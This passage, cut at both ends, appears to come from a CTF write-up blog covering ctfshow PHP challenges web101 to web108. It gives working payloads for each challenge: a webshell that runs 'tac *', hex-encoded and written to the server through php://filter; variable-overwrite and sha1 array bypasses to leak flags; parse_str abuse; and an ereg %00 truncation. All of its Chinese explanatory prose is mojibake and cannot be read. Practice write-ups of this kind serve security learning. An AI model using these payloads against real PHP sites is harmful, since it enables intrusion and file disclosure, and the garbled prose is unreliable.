class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$v2=$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">$v3=$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">$v0=is_numeric($v1) <span class="keyword">and</span> is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v0)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, $v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, $v3))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>Âú®‰∏ä‰∏ÄÈ¢òÂü∫Á°Ä‰∏äÂ§öËøõË°å‰∫ÜËøáÊª§ÔºåÊâÄ‰ª•‰∏äÈ¢òpayloadÊó†Ê≥ï‰ΩøÁî®ÔºåÊü•‰∫Ü‰∏Ä‰∏ãËµÑÊñôÔºåÂèëÁé∞ËøòÊúâÁ±ªÂèçÂ∞ÑÁöÑÁü•ËØÜÁÇπ</p><blockquote><p>PHP Reflection APIÊòØPHP5ÊâçÊúâÁöÑÊñ∞ÂäüËÉΩÔºåÂÆÉÊòØÁî®Êù•ÂØºÂá∫ÊàñÊèêÂèñÂá∫ÂÖ≥‰∫éÁ±ª„ÄÅÊñπÊ≥ï„ÄÅÂ±ûÊÄß„ÄÅÂèÇÊï∞Á≠âÁöÑËØ¶ÁªÜ‰ø°ÊÅØÔºåÂåÖÊã¨Ê≥®Èáä„ÄÇ<br>$class = new ReflectionClass(‚Äòctfshow‚Äô); // Âª∫Á´ã PersonËøô‰∏™Á±ªÁöÑÂèçÂ∞ÑÁ±ª<br>$instance = $class-&gt;newInstanceArgs($args); // Áõ∏ÂΩì‰∫éÂÆû‰æãÂåñctfshowÁ±ª</p></blockquote><p>paylaod‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;;</span><br></pre></td></tr></table></figure><p>‰πüË¶ÅÂÉè‰∏äÈ¢ò‰∏ÄÊ†∑ÊîπÊéâ0x2dÂíåÊúÄÂêé‰∏Ä‰ΩçËøõË°åÁàÜÁ†¥</p><h3 id="web102"><a class="header-anchor" href="#web102">¬∂</a>web102</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$v1 = $_POST[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">$v3 = $_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">$v4 = is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v4)&#123;</span><br><span class="line">    $s = substr($v2,<span class="number">2</span>);</span><br><span class="line">    $str = call_user_func($v1,$s);</span><br><span class="line">    <span class="keyword">echo</span> $str;</span><br><span class="line">    file_put_contents($v3,$str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>È¶ñÂÖàÁªßÁª≠‰∫ÜËß£Âá†‰∏™ÂáΩÊï∞</p><blockquote><p><strong>is_numeric()</strong> ÂáΩÊï∞Áî®‰∫éÊ£ÄÊµãÂèòÈáèÊòØÂê¶‰∏∫Êï∞Â≠óÊàñÊï∞Â≠óÂ≠óÁ¨¶‰∏≤ÔºåÂ¶ÇÊûúÊåáÂÆöÁöÑÂèòÈáèÊòØÊï∞Â≠óÂíåÊï∞Â≠óÂ≠óÁ¨¶‰∏≤ÂàôËøîÂõûtrueÔºåÂê¶ÂàôËøîÂõûfalse„ÄÇÂ¶ÇÊûúÂ≠óÁ¨¶‰∏≤‰∏≠Âê´Êúâ‰∏Ä‰∏™e‰ª£Ë°®ÁßëÂ≠¶ËÆ°Êï∞Ê≥ïÔºå‰πüÂèØËøîÂõûtrue</p><p><strong>call_user_func()</strong> ÂáΩÊï∞Áî®‰∫éË∞ÉÁî®ÊñπÊ≥ïÊàñËÄÖÂèòÈáèÔºåÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÊòØË¢´Ë∞ÉÁî®ÁöÑÂáΩÊï∞ÔºåÁ¨¨‰∫å‰∏™ÊòØË∞ÉÁî®ÁöÑÂáΩÊï∞ÁöÑÂèÇÊï∞</p><p><strong>file_put_contents()</strong> ÂáΩÊï∞Â∫îËØ•ÈÉΩÁÜüÊÇâ‰∫ÜÔºåÂÜôÂÖ•ÂÜÖÂÆπÂà∞Êñá‰ª∂‰∏≠ÔºåÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÊòØÊñá‰ª∂ÂêçÔºåÁ¨¨‰∫å‰∏™ÂèÇÊï∞ÊòØÂÜÖÂÆπ</p></blockquote><p>È¶ñÂÖàÔºåget‰º†ÂèÇv2Âíåv3Ôºåpost‰º†ÂèÇv1Ôºõif‰∏≠ÈúÄË¶Åv4‰∏∫ÁúüÊâçËÉΩÂæÄ‰∏ãÊâßË°åÔºåËÄåv4Ë¶Å‰∏∫ÁúüÂ∞±ÊòØv2‰º†ÁöÑÂèÇÊï∞Ë¶Å‰∏∫Êï∞Â≠óÊàñËÄÖÊï∞Â≠óÂ≠óÁ¨¶‰∏≤ÔºåÂêåÊó∂v2‰πüÊòØÊàë‰ª¨Ë¶ÅÂÜôÂÖ•ÁöÑwebshell<br>‰∏∫‰∫ÜËÆ©v2‰∏∫Êï∞Â≠óÊàñËÄÖÊï∞Â≠óÂ≠óÁ¨¶‰∏≤ÔºåÊàë‰ª¨ÂèØ‰ª•ÂÖàÊääÊàë‰ª¨ÁöÑwebshellËΩ¨Êç¢‰∏∫base64ÁºñÁ†ÅÔºåÂÜçÊääbase64ÁºñÁ†ÅËΩ¨Êç¢‰∏∫16ËøõÂà∂ÔºåËøôÊòØ‰∏ÄÁßçÂäûÊ≥ïÂéªËΩ¨Êç¢ÊàêÊï∞Â≠ó</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$b = base64_encode(<span class="string">&#x27;&lt;?=`tac *`;&#x27;</span>);</span><br><span class="line">$b = str_replace(<span class="string">&quot;=&quot;</span>,<span class="string">&quot;&quot;</span>,$b);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;base64Âä†ÂØÜÂêé:&quot;</span>.$b.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$a = call_user_func(<span class="string">&#x27;bin2hex&#x27;</span>,$b);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;16ËøõÂà∂ÂΩ¢Âºè:&quot;</span>.$a.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">var_dump(is_numeric($a));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*ËøêË°åÁªìÊûú</span></span><br><span class="line"><span class="comment">base64Âä†ÂØÜÂêé:PD89YHRhYyAqYDs</span></span><br><span class="line"><span class="comment">16ËøõÂà∂ÂΩ¢Âºè:504438395948526859794171594473</span></span><br><span class="line"><span class="comment">bool(true)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>ËØ¥ÊòéÔºö&lt;?=ÊòØphpÁöÑÁü≠Ê†áÁ≠æÔºåÊòØecho()ÁöÑÂø´Êç∑Áî®Ê≥ï<br>ËøòÊúâ‰∏ÄÁÇπÔºåÂ∞±ÊòØsubstr()ÂèñÂæóÊòØ‰ªé‰∏ãÊ†á‰∏∫2ÂºÄÂßãÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÊàë‰ª¨Âú®ÂâçÈù¢Âä†00‰∏§‰ΩçÊï∞<br>ÊâÄ‰ª•payload‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?v2&#x3D;00504438395948526859794171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;dotast.php</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">v1&#x3D;hex2bin</span><br></pre></td></tr></table></figure><p>Ëß£ÁùÄÂÜçËÆøÈóÆdotast.phpÂç≥ÂèØÂæóÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web102/%40%5DWGZPG6ZM95T567AW%40W0I5.png" alt=""></p><h3 id="web103"><a class="header-anchor" href="#web103">¬∂</a>web103</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$v1 = $_POST[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">$v3 = $_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">$v4 = is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v4)&#123;</span><br><span class="line">    $s = substr($v2,<span class="number">2</span>);</span><br><span class="line">    $str = call_user_func($v1,$s);</span><br><span class="line">    <span class="keyword">echo</span> $str;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/.*p.*h.*p.*/i&quot;</span>,$str))&#123;</span><br><span class="line">        file_put_contents($v3,$str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sorry&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>Âíå‰∏äÈ¢ò‰∏ÄÊ†∑ÁöÑÊÄùË∑ØÔºåpayloadÁªßÁª≠Áî®‰∏äÈ¢òÁöÑ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?v2&#x3D;00504438395948526859794171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;dotast.php</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">v1&#x3D;hex2bin</span><br></pre></td></tr></table></figure><h3 id="web104"><a class="header-anchor" href="#web104">¬∂</a>web104</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1($v1)==sha1($v2))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÂÄíÊòØÂèòÂæóÁÆÄÂçï‰∫ÜÔºåËÄÉÁöÑsha1ÂáΩÊï∞ÁâπÊÄßÔºåsha1()ÂáΩÊï∞Êó†Ê≥ïÂ§ÑÁêÜÊï∞ÁªÑÁ±ªÂûãÔºå‰ºöËøîÂõûNULLÔºåifÊù°‰ª∂Â∞±ÊàêÁ´ã‰∫ÜÔºåÊâÄ‰ª•paylaod‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?v2[]&#x3D;</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">v1[]&#x3D;</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web104/701D5594A%60SX_%60RC_PP3W_V.png" alt=""></p><h3 id="web105"><a class="header-anchor" href="#web105">¬∂</a>web105</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$error=<span class="string">&#x27;‰Ω†ËøòÊÉ≥Ë¶ÅflagÂòõÔºü&#x27;</span>;</span><br><span class="line">$suces=<span class="string">&#x27;Êó¢ÁÑ∂‰Ω†ÊÉ≥Ë¶ÅÈÇ£Áªô‰Ω†ÂêßÔºÅ&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($key===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;<span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($value===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!($_POST[<span class="string">&#x27;flag&#x27;</span>]==$flag))&#123;</span><br><span class="line">    <span class="keyword">die</span>($error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.$flag.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>($suces);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>ËøôÈáåÂà©Áî®ÁöÑÊòØÂèòÈáèË¶ÜÁõñÔºåÂÖ≥ÈîÆÁÇπÂú®$$key=$$valueÔºåËøôÈáåÊää$keyÁöÑÂÄºÂΩì‰Ωú‰∫ÜÂèòÈáè</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‰æãÂ¶Ç $key&#x3D;flag  Âàô$$key&#x3D;$flag</span><br></pre></td></tr></table></figure><p>ËøôÈáå‰∏ÄÂÖ±Êúâ‰∏â‰∏™ÂèòÈáèÔºå$error„ÄÅ$sucesÂíå$flagÔºõËøôÈáåÈÄöËøádie($error)ÊàñËÄÖdie($suces)ÈÉΩÂèØ‰ª•ËæìÂá∫flagÔºåÊâÄ‰ª•Êúâ‰∏§‰∏™paylaod<br><strong>Á¨¨‰∏ÄÁßçÔºö</strong><br>ÈÄöËøádie($error)ËæìÂá∫flagÔºåÈ¶ñÂÖàÊàë‰ª¨Êää$flagÁöÑÂÄº‰º†Áªô$dotastÔºåÊé•ÁùÄÂÜçÊää$dotastÁöÑÂÄº‰º†Áªô$errorÔºå‰∫éÊòØ$errorÁöÑÂÄºÂ∞±ÊòØflagÔºåÂÜçÈÄöËøáifÂà§Êñ≠dieËæìÂá∫Â∞±ÊòØflag<br>‰æãÂ¶Ç$flag=ctfshow{xxxxx}Ôºå?dotast=flagÔºåÈÄöËøáÁ¨¨‰∏Ä‰∏™forÂæ™ÁéØÔºå‰πüÂ∞±ÊòØ$dotast=$flagÔºå$dotast=ctfshow{xxxxx}ÔºåÊé•ÁùÄÂÜçÈÄöËøáÁ¨¨‰∫å‰∏™forÂæ™ÁéØÔºå$error=$dotastÔºåÊ≠§Êó∂$error=ctfshow{xxxxx}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?dotast&#x3D;flag</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">error&#x3D;dotast</span><br></pre></td></tr></table></figure><p><strong>Á¨¨‰∫åÁßçÔºö</strong><br>ÈÄöËøádie($suces)ËæìÂá∫flagÔºåÈ¶ñÂÖàÊàë‰ª¨ÊääflagÁöÑÂÄº‰º†ÁªôsucesÂèòÈáèÔºåÊé•ÁùÄÂÜçÊääflagÁöÑÂÄºÁªôÁΩÆÁ©∫ÔºåÂ∑≤ËææÂà∞‰∏ãÈù¢ifÊù°‰ª∂‰∏∫0‰∏çÊâßË°åÁöÑÁõÆÁöÑÔºåÂæÄ‰∏ãÊâßË°åÔºådie($suces)Âç≥ÂèØÊääflagËæìÂá∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?suces&#x3D;flag&amp;flag&#x3D;</span><br></pre></td></tr></table></figure><h3 id="web106"><a class="header-anchor" href="#web106">¬∂</a>web106</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÂèàÂõûÂΩíÂà∞sha1()ÂáΩÊï∞ÁöÑÈóÆÈ¢òÔºåËøôÊ¨°Âú®ÂâçÈù¢Â§öÂä†‰∫Ü‰∏Ä‰∏™Âà§Êñ≠<code>$v1 != $v2</code>ÔºåÊàë‰ª¨Â∞±Áªô‰ªñ‰ª¨ËµãÂÄº‰∏çÂêåÂ∞±Â•Ω‰∫ÜÔºåpayloadÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?v2[]&#x3D;1</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">v1[]&#x3D;2</span><br></pre></td></tr></table></figure><h3 id="web107"><a class="header-anchor" href="#web107">¬∂</a>web107</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v3 = $_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    parse_str($v1,$v2);</span><br><span class="line">    <span class="keyword">if</span>($v2[<span class="string">&#x27;flag&#x27;</span>]==md5($v3))&#123;</span><br><span class="line">    	<span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>È¶ñÂÖàÈúÄË¶Å‰º†‰∏Ä‰∏™getÂèÇÊï∞<code>v3</code>Âíå‰∏Ä‰∏™postÂèÇÊï∞<code>v1</code>ÔºåÊ≥®ÊÑèÂà∞‰∏Ä‰∏™ÂáΩÊï∞parse_str()</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parse_str(string,array)</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left">ÂèÇÊï∞</th><th style="text-align:left">ÊèèËø∞</th></tr></thead><tbody><tr><td style="text-align:left"><em>string</em></td><td style="text-align:left">ÂøÖÈúÄ„ÄÇËßÑÂÆöË¶ÅËß£ÊûêÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇ</td></tr><tr><td style="text-align:left"><em>array</em></td><td style="text-align:left">ÂèØÈÄâ„ÄÇËßÑÂÆöÂ≠òÂÇ®ÂèòÈáèÁöÑÊï∞ÁªÑÁöÑÂêçÁß∞„ÄÇËØ•ÂèÇÊï∞ÊåáÁ§∫ÂèòÈáèÂ∞ÜË¢´Â≠òÂÇ®Âà∞Êï∞ÁªÑ‰∏≠„ÄÇ</td></tr></tbody></table></blockquote><p>‰∏æ‰æã</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="string">&quot;name=dotast&amp;age=666&quot;</span>;</span><br><span class="line">parse_str($a,$b);</span><br><span class="line"><span class="keyword">echo</span> $b[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">#ËæìÂá∫ÁªìÊûú</span></span><br><span class="line"><span class="comment">//dotast</span></span><br><span class="line"><span class="comment">//666</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ÊâÄ‰ª•paylaod‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?v3&#x3D;dotast</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">v1&#x3D;flag&#x3D;208f1b1289da972682cbc81c8684fcc8</span><br></pre></td></tr></table></figure><h3 id="web108"><a class="header-anchor" href="#web108">¬∂</a>web108</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, $_GET[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Âè™Êúâ36dÁöÑ‰∫∫ÊâçËÉΩÁúãÂà∞flag</span></span><br><span class="line"><span class="keyword">if</span>(intval(strrev($_GET[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>È¶ñÂÖà‰∫ÜËß£‰∏Ä‰∏ãÂá†‰∏™ÂáΩÊï∞</p><blockquote><p><strong>ereg()</strong> ÂáΩÊï∞ÊêúÁ¥¢Áî±ÊåáÂÆöÁöÑÂ≠óÁ¨¶‰∏≤‰Ωú‰∏∫Áî±Ê®°ÂºèÊåáÂÆöÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÂ¶ÇÊûúÂèëÁé∞Ê®°ÂºèÂàôËøîÂõûtrueÔºåÂê¶ÂàôËøîÂõûfalse„ÄÇÊêúÁ¥¢ÂØπ‰∫éÂ≠óÊØçÂ≠óÁ¨¶ÊòØÂå∫ÂàÜÂ§ßÂ∞èÂÜôÁöÑ</p><p><strong>strrev()</strong> ÂáΩÊï∞ÂèçËΩ¨Â≠óÁ¨¶‰∏≤„ÄÇ</p><p><strong>intval()</strong> ÂáΩÊï∞Áî®‰∫éËé∑ÂèñÂèòÈáèÁöÑÊï¥Êï∞ÂÄº</p></blockquote><p>È¶ñÂÖàÈúÄË¶ÅÁü•ÈÅì%00ÂèØ‰ª•Êà™Êñ≠ereg()ÂáΩÊï∞ÁöÑÊêúÁ¥¢ÔºåÊ≠£ÂàôË°®ËææÂºèÂè™‰ºöÂåπÈÖç%00‰πãÂâçÁöÑÂÜÖÂÆπÔºõ0x36dÁöÑÂçÅËøõÂà∂ÂÜÖÂÆπ‰∏∫877ÔºåÊàë‰ª¨ÈúÄË¶ÅÂ≠óÊØçÂú®ÂâçÊù•Êª°Ë∂≥ifÊù°‰ª∂ÁöÑÊ≠£ÂàôÂåπÈÖçÊù•Ë∑≥ËøáifËØ≠Âè•ÔºåÊé•ÁùÄÂÜçËøõË°åÂ≠óÁ¨¶‰∏≤ÁöÑÂèçËΩ¨ÂæóÂà∞877aÔºåÊé•ÁùÄintval()ÂáΩÊï∞ÂèñÊï¥Êï∞ÈÉ®ÂàÜÂæóÂà∞877<br>ÊâÄ‰ª•paylaod‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;a%00778</span><br></pre></td></tr></table></figure><h3 id="web109"><a class="header-anchor" 